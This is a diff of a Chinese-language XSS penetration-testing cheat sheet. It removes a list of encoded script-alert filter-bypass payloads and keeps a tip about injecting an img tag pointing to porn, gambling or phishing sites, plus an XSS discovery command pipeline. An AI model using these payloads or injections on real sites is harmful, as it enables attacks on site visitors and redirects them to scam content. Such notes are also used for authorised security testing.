@@ -72,15 +72,6 @@ XSS
     - 文本编辑器（所有功能）
 + 技巧
     - 无法弹框的情况下，插入img:  ``<img src=""/>`` ,src加入黄色网站，赌博网站，钓鱼网站等
-    - 编码绕过
-        ::
-            
-            %3Cscript%3Ealert(1)%3C/script%3E
-            %253Cscript%253Ealert(1)%253C/script%253E
-            &#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
-            &#x253C;script&#x253E;alert(1)&#x253C;/script&#x3E;
-            \u003Cscript\u003Ealert(1)\u003C/script\u003E
-            %26%2360;/u%26%2362;
 + 命令
     - ``echo https://www.example.com/ | gau | gf xss| uro | Gxss | kxss | tee xss_output.txt``
     - ``python loxs.py``
